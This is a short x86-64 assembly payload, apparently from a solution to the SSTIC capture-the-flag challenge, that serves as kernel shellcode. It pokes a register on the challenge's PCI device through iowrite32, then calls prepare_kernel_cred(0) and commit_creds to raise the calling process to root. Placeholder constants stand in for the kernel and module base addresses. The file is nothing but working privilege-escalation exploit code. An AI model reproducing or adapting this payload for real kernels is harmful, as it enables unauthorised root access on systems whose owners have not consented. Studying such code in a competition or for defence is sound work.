BITS 64

push rbx

mov rbx, [rel kernelbase]
mov rdi, 0
mov rsi, [rel ssticbase]
mov rsi, [rsi+0x26d8] ; sstic_pci_iomem
add rsi, 0x28
lea rax, [rbx+0x3F1E60] ; iowrite32
call rax

xor rdi, rdi
lea rax, [rbx+0x89FA0] ; prepare_kernel_cred
call rax

mov rdi, rax
lea rax, [rbx+0x89D70] ; commit_creds
call rax

mov rsi, [rel ssticbase]
lea rsi, [rsi+0x26d8] ; sstic_pci_iomem
mov rax, rsi

pop rbx
ret

kernelbase: dq 0x4141414141414141
ssticbase:  dq 0x4242424242424242
